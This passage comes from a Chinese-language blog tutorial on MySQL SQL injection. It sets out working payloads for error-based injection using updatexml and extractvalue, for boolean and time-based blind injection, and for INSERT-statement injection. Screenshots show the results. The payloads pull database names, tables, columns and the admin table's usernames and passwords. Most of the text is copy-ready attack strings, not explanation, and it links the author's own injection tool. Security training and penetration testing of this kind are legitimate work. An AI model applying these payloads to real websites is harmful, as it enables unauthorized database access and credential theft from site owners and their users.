<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure>
<ul>
<li>第二个</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE (XML_document, XPath_string);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br></pre></td></tr></table></figure>
<p><strong>payload整理：</strong></p>
<ul>
<li>获数据库取版本号</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(0,concat(0x7c,version()),1)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524065066.3989744.png" alt=""></p>
<ul>
<li>查表名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(0,concat(0x7c,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>())),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524065212.6766431.png" alt=""></p>
<ul>
<li>查列名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(0,concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_name=&apos;admin&apos;)),1)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524065322.5496373.png" alt=""></p>
<ul>
<li>查数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(0,concat(0x7c,(<span class="keyword">select</span> <span class="keyword">concat</span>(<span class="keyword">user</span>,<span class="number">0x7c</span>,pwd) <span class="keyword">from</span> <span class="keyword">admin</span>)),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524065469.2720308.png" alt=""></p>
<ul>
<li>EXTRACTVALUE函数payload：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">and EXTRACTVALUE(0,concat(0x7c,version()))</span><br><span class="line"></span><br><span class="line">and EXTRACTVALUE(0,concat(0x7c,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>())))</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> EXTRACTVALUE(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7c</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> EXTRACTVALUE(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7c</span>,(<span class="keyword">select</span> <span class="keyword">concat</span>(<span class="keyword">user</span>,<span class="number">0x7c</span>,pwd) <span class="keyword">from</span> <span class="keyword">admin</span>)))</span><br></pre></td></tr></table></figure>
<p><strong>一个问题：</strong></p>
<p>&emsp;&emsp;updatexml 和 EXTRACTVALUE函数都只能爆出32位数据，如果要爆出32位以后的数据，需要借助mid函数来进行字符截取从而显示32位以后的数据。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid(string,<span class="keyword">start</span>,[<span class="keyword">length</span>])</span><br></pre></td></tr></table></figure>
<h4 id="盲注-基于布尔的盲注"><a href="#盲注-基于布尔的盲注" class="headerlink" title="盲注-基于布尔的盲注"></a>盲注-基于布尔的盲注</h4><p>&emsp;&emsp;在一些站点隐藏了错误信息的情况下，联合查询以及报错注入的方法均无法注入出数据的时候，需要用到盲注的方法来进行注入。</p>
<p>&emsp;&emsp;基于布尔的盲注是根据页面差来进行判断注入和数据注入的。在存在注入的页面输入and (true)则返回页面1；输入and (false)则返回页面2，而页面1和页面2有差别，常见的情况页面1是正常页面，页面2是错误页面</p>
<p>&emsp;&emsp;基于布尔盲注的过程：</p>
<ul>
<li>判断盲注</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 </span><br><span class="line">and 1=2</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;返回页面不相同。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524193086.9383357.png" alt=""></p>
<ul>
<li>猜解当前数据库用户名</li>
</ul>
<p>&emsp;&emsp;第一步：判断当前数据库用户名的长度(以便逐位猜解用户名)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">user</span>()))=长度</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524193398.0539575.png" alt=""></p>
<p>&emsp;&emsp;第二步：逐位猜解当前数据库用户名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">user</span>(),位数,<span class="number">1</span>)))=<span class="keyword">ascii</span>码</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524193521.2949898.png" alt=""></p>
<ul>
<li>猜解当前数据库名</li>
</ul>
<p>&emsp;&emsp;第一步：判断当前数据库的长度(以便逐位猜解数据库名)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>()))=长度</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524193707.6899326.png" alt=""></p>
<p>&emsp;&emsp;第二步：逐位猜解数据库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),位数,<span class="number">1</span>)))=<span class="keyword">ascii</span>码</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524193895.8931358.png" alt=""></p>
<ul>
<li>猜解表名</li>
</ul>
<p>&emsp;&emsp;第一步：判断表名的数量(以便逐个判断表名长度)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=数量</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524194107.7990391.png" alt=""></p>
<p>&emsp;&emsp;第二步：判断某个表的长度(以便逐位猜解表名)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">length</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> n,<span class="number">1</span>)=长度</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524196585.3383462.png" alt=""></p>
<p>&emsp;&emsp;第三步：逐位猜解表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(table_name,位数,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> n,<span class="number">1</span>)=<span class="keyword">ascii</span>码</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524196742.9813938.png" alt=""></p>
<ul>
<li>猜解列名</li>
</ul>
<p>&emsp;&emsp;第一步：判断列名的数量(以便逐个判断列名长度)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"表名"</span>)=数量</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524196907.0254436.png" alt=""></p>
<p>&emsp;&emsp;第二步：判断某个列的长度(以便逐位猜解列名)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">length</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"表名"</span> <span class="keyword">limit</span> n,<span class="number">1</span>)=长度</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524197010.0763369.png" alt=""></p>
<p>&emsp;&emsp;第三步：逐位猜解列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(column_name,位数,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"表名"</span> <span class="keyword">limit</span> n,<span class="number">1</span>)=<span class="keyword">ascii</span>码</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524197200.762367.png" alt=""></p>
<ul>
<li>猜数据</li>
</ul>
<p>&emsp;&emsp;第一步：判断数据的数量(以便逐个判断数据长度)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(<span class="keyword">user</span>) <span class="keyword">from</span> <span class="keyword">admin</span>)=数量</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524197312.9619484.png" alt=""></p>
<p>&emsp;&emsp;第二步：判断某条数据的长度(以便逐位猜解数据)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">user</span>) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">limit</span> n,<span class="number">1</span>)=长度</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524197408.0634718.png" alt=""></p>
<p>&emsp;&emsp;第三步：逐位猜解数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">user</span>,位数,<span class="number">1</span>)) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">limit</span> n,<span class="number">1</span>)=<span class="keyword">ascii</span>码</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524197489.435833.png" alt=""></p>
<p>&emsp;&emsp;<strong>基于布尔盲注的实质：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (SQL语句)=数字 ，页面正确则结果为该数字，否则不是</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;盲注过程十分的繁琐，可以自己编写工具进行测试，也可以用笔者的工具 <a href="https://github.com/admintony/SQL-injection" target="_blank" rel="noopener">https://github.com/admintony/SQL-injection</a> 进行测试</p>
<h4 id="盲注-基于时间的盲注"><a href="#盲注-基于时间的盲注" class="headerlink" title="盲注-基于时间的盲注"></a>盲注-基于时间的盲注</h4><p>&emsp;&emsp;基于布尔的盲注和基于时间的盲注不同，<strong>前者是通过页面差来判断是否存在注入以及数据注入的;后者无法得到页面差(比如：无论输入什么都得到同一个页面),而它只能通过SQL语句执行的时间来判断注入以及数据注入</strong></p>
<p>&emsp;&emsp;常见无界面差的情况:</p>
<ul>
<li><p>1.无论输入什么都只显示无信息页面，例如登陆页面。这种情况下可能只有登录失败页面，错误页面被屏蔽了，并且在没有密码的情况下，登录成功的页面一般情况下也不知道。在这种情况下，有可能基于时间的SQL注入会有效。</p>
</li>
<li><p>2.无论输入什么都只显示正常信息页面。例如，采集登录用户信息的模块页面。采集用户的 IP、浏览器类型、refer字段、session字段，无论用户输入什么，都显示正常页面。</p>
</li>
</ul>
<p>&emsp;&emsp;注入过程：</p>
<ul>
<li>判断基于时间的盲注</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and if(1=1,sleep(6),1)</span><br><span class="line">and if(1=2,sleep(6),1)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524153434.0902214.png" alt=""></p>
<p>&emsp;&emsp;如上图所示，当if判断为真时，则会延时6s(sql语句执行了1s+延时6s=7s)；而if判断为假时，则不延时，如下图。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524154916.1373055.png" alt=""></p>
<ul>
<li>猜解当前数据库用户名</li>
</ul>
<p>&emsp;&emsp;第一步：猜解用户名的长度。(猜解到的用户名长度用于下面的逐位猜解用户名)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">user</span>()))=长度,<span class="keyword">sleep</span>(<span class="number">6</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524155043.098468.png" alt=""></p>
<p>&emsp;&emsp;第二步：逐位猜解用户名。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">user</span>(),位数,<span class="number">1</span>))=<span class="keyword">ascii</span>码),<span class="keyword">sleep</span>(<span class="number">6</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524155120.9458823.png" alt=""></p>
<ul>
<li>猜解当前数据库名</li>
</ul>
<p>&emsp;&emsp;第一步：猜解数据库名的长度。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>()))=长度,<span class="keyword">sleep</span>(<span class="number">6</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524155395.9928312.png" alt=""></p>
<p>&emsp;&emsp;第二步：猜解数据库名。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),位数,<span class="number">1</span>))=<span class="keyword">ascii</span>码),<span class="keyword">sleep</span>(<span class="number">6</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524155548.1466534.png" alt=""></p>
<ul>
<li>猜表名</li>
</ul>
<p>&emsp;&emsp;第一步：判断表名的数量(以便逐个猜表名)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=个数,<span class="keyword">sleep</span>(<span class="number">6</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524155668.090352.png" alt=""></p>
<p>&emsp;&emsp;第二步：判断某个表名的长度(以便逐位猜表名的数据)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">length</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> n,<span class="number">1</span>)=长度,<span class="keyword">sleep</span>(<span class="number">6</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524155935.3051393.png" alt=""></p>
<p>&emsp;&emsp;第三步：逐位猜表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(table_name,位数,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> n,<span class="number">1</span>)=<span class="keyword">ascii</span>码,<span class="keyword">sleep</span>(<span class="number">6</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524156099.473438.png" alt=""></p>
<ul>
<li>猜列名</li>
</ul>
<p>&emsp;&emsp;第一步：判断列名的数量(以便逐个猜列名)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"表名"</span>)=个数,<span class="keyword">sleep</span>(<span class="number">6</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524156342.983754.png" alt=""></p>
<p>&emsp;&emsp;第二步：判断某个列名的长度(以便逐位猜列名的数据)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">length</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"表名"</span> <span class="keyword">limit</span> n,<span class="number">1</span>)=长度,<span class="keyword">sleep</span>(<span class="number">6</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524156447.8766873.png" alt=""></p>
<p>&emsp;&emsp;第三步：逐位猜列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(column_name,位数,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"表名"</span> <span class="keyword">limit</span> n,<span class="number">1</span>)=<span class="keyword">ascii</span>码,<span class="keyword">sleep</span>(<span class="number">6</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524156567.1563952.png" alt=""></p>
<ul>
<li>猜数据</li>
</ul>
<p>&emsp;&emsp;第一步：判断数据的数量(以便逐个猜数据)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">count</span>(列名) <span class="keyword">from</span> 表名)=个数,<span class="keyword">sleep</span>(<span class="number">6</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524156769.0986266.png" alt=""></p>
<p>&emsp;&emsp;第二步：判断某个数据的长度(以便逐位猜数据)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">user</span>) <span class="keyword">from</span> <span class="keyword">admin</span>)=<span class="number">5</span>,<span class="keyword">sleep</span>(<span class="number">6</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524156908.8752792.png" alt=""></p>
<p>&emsp;&emsp;第三步：逐位猜数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> <span class="keyword">admin</span>)=<span class="number">97</span>,<span class="keyword">sleep</span>(<span class="number">6</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524156985.5043707.png" alt=""></p>
<p>&emsp;&emsp;基于时间的盲注实质：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(布尔盲注语句,sleep(5),1)</span><br></pre></td></tr></table></figure>
<h3 id="根据程序SQL语句分类"><a href="#根据程序SQL语句分类" class="headerlink" title="根据程序SQL语句分类"></a>根据程序SQL语句分类</h3><p>&emsp;&emsp;后台执行的SQL语句，不仅有select一种，还有INSERT、UPDATE、DELETE等。语句不同，注入的方法也就不一样了,下面我们就来介绍一下其他语句的注入方法。</p>
<h4 id="INSERT注入"><a href="#INSERT注入" class="headerlink" title="INSERT注入"></a>INSERT注入</h4><h5 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h5><ul>
<li>方法1：</li>
</ul>
<p>&emsp;&emsp;第一步：在数据提交点，插入单引号，如果数据插入失败，那么80%是注入，20%是拦截。</p>
<p>&emsp;&emsp;<strong>原因：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名(col1,col2,col3) <span class="keyword">VALUES</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;一般程序中的INSERT语句之中VALUES的值都是用单引号来包裹的，int型的不需要。所以插入单引号的时候就会影响语句闭合，因此插入失败。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524282973.848182.png" alt=""></p>
<p>&emsp;&emsp;第二步：在数据提交点，插入双引号,数据正常插入，这时候90%确定是注入点了。</p>
<p>&emsp;&emsp;<strong>原因：</strong>双引号不影响语句的闭合，因此插入成功。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524282997.5251796.png" alt=""></p>
<p>&emsp;&emsp;第三步：在数据提交点，插入\’,数据正常插入，这时候100%确认是注入点了。</p>
<p>&emsp;&emsp;<strong>原因：</strong>\’是对单引号进行转义，转义后的单引号不会影响语句的闭合，因此插入成功。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524283158.466618.png" alt=""></p>
<ul>
<li>方法2：</li>
</ul>
<p>&emsp;&emsp;方法1比较繁琐，而且对于int型的数据插入点测试可能会失效，int型数据不需要单引号来包裹。</p>
<p>&emsp;&emsp;方法2测试语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep(5)</span><br><span class="line">'or sleep(5) or'</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在int型数据插入点，由于没有单引号包裹，所以可以直接用sleep(5)来判断，如果延时5秒则存在注入；而string型的数据插入点，有单引号包裹，所以我们要先闭合单引号。</p>
<h5 id="报错法"><a href="#报错法" class="headerlink" title="报错法"></a>报错法</h5><p>&emsp;&emsp;报错法，顾名思义，就是使用报错注入的方法进行注入的，但是这个方法有个局限性，那就是需要：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> mysql_error(); <span class="comment">//打印语句执行出错信息</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们先看下正常的INSERT语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名(col1,col2,col3) <span class="keyword">VALUES</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;INSERT语句的可控点在于VALUES中的值，这里我们就需要来闭合引号了，否则我们提交的SQL语句会被当作字符串来处理(原封不动的将语句插入数据库)。</p>
<p>&emsp;&emsp;因此，INSERT语句配合报错注入的语句结构为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or updatexml(0,concat(0x7c,注入语句),1) or '</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;接下来看注入的过程：</p>
<ul>
<li>爆版本号</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or updatexml(0,concat(0x7c,version()),1) or '</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524280343.6668375.png" alt=""></p>
<ul>
<li>爆数据库用户名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or updatexml(0,concat(0x7c,user()),1) or '</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524280498.1591094.png" alt=""></p>
<ul>
<li>爆表名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'or updatexml(0,concat(0x7c,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>())),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">'</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524281061.314386.png" alt=""></p>
<ul>
<li>爆列名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'or updatexml(1,concat(0x7c,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span>)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">'</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524281371.0608706.png" alt=""></p>
<ul>
<li>爆数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'and updatexml(1,concat(0x7c,(<span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> student <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>) <span class="keyword">and</span><span class="string">'</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524281519.8612456.png" alt=""></p>
<h5 id="闭合语句法"><a href="#闭合语句法" class="headerlink" title="闭合语句法"></a>闭合语句法</h5><p>&emsp;&emsp;闭合语句法不是上面我们说的闭合引号，而是通过闭合的方法将语句补充完整，使语句可以正常执行。这种方法的优点在于：不需要打印mysql执行的错误语句；其缺点在于：INSERT语句执行后，插入的信息能回显到界面中才行。</p>
<p>&emsp;&emsp;我们先看下正常的INSERT语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名(col1,col2,col3) <span class="keyword">VALUES</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>);</span><br></pre></td></tr></table></figure>
